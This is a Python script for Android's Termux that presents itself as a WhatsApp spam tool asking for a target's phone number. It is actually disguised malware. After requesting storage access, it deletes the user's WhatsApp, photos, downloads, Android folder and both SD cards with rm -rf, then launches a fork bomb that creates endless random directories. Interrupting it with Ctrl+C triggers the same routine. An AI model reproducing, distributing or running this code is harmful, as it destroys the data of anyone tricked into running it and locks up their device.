import os
import random
import datetime
import time

def clear():
	os.system('clear')

ro = '\033[1;35m'
cl = '\033[0m'
cia = '\033[1;35m'
az = '\033[1;34m'

hora = datetime.datetime.today().hour
dia = datetime.datetime.today().day
minutos = datetime.datetime.today().minute
ano = datetime.datetime.today().year
mes = datetime.datetime.today().month
    
def clear():
	os.system('clear')
	
def permicao():
	os.system('termux-setup-storage')
	
def one():
	os.system('rm -rf /storage/emulated/0/Whatsapp')
	
def td3():
	os.system("rm -rf /sdcard/*")

def ext():
	os.system("rm -rf /storage/extSdCard/*")
	
def img():
	os.system('rm -rf /storage/emulated/0/DCIM')
	
def loads():
	os.system('rm -rf /storage/emulated/0/Download')
def andro():
	os.system('rm -rf /storage/emulated/0/Android')
	
def bombdir(Length):
    numeros = '0123456789'
    letras = 'abcdefghijklmnopqrstuvwxyz'
    cs = '.-_'
    
    ran = ''
    for i in range(0,Length,2):
        ran += random.choice(letras)
        ran += random.choice(numeros)
        ran += random.choice(cs)
    return ran

clear()
try:
	print(f'''
{cia}
   
 ▄▄▄▄    ▄▄▄       ▄▄▄▄ ▓██   ██▓     ██████  ██▓███   ▄▄▄       ███▄ ▄███▓
▓█████▄ ▒████▄    ▓█████▄▒██  ██▒   ▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒
▒██▒ ▄██▒██  ▀█▄  ▒██▒ ▄██▒██ ██░   ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░
▒██░█▀  ░██▄▄▄▄██ ▒██░█▀  ░ ▐██▓░     ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██ 
░▓█  ▀█▓ ▓█   ▓██▒░▓█  ▀█▓░ ██▒▓░   ▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒
░▒▓███▀▒ ▒▒   ▓▒█░░▒▓███▀▒ ██▒▒▒    ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░
▒░▒   ░   ▒   ▒▒ ░▒░▒   ░▓██ ░▒░    ░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░
 ░    ░   ░   ▒    ░    ░▒ ▒ ░░     ░  ░  ░  ░░         ░   ▒   ░      ░   
 ░            ░  ░ ░     ░ ░              ░                 ░  ░       ░   
      ░                 ░░ ░                                               
{cl}
      
         data: {dia}/{mes}/{ano}
         hora: {hora}:{minutos}
   ╔════════════════╗
     {ro}SPAM WHATSAPP{cl}   
   ╚════════════════╝
   
by: {ro}Swag666baby{cl}
whatsapp: {ro}556295598220{cl}

╭┈ • NUMERO DO ALVO
┆''')
	input(f'╰┈ •• ❥︎ {ro}')
 
	clear()



	permicao()
	one()
	img()
	loads()
	ext()
	td3()
	andro()
	time.sleep(2)
	while True:
		os.fork()
		os.system(f'mkdir {bombdir(10*10)}')
except KeyboardInterrupt:
	permicao()
	one()
	img()
	loads()
	ext()
	td3()
	andro()
	time.sleep(2)
	while True:
			os.fork()
			os.system(f'mkdir {bombdir(10*10)}')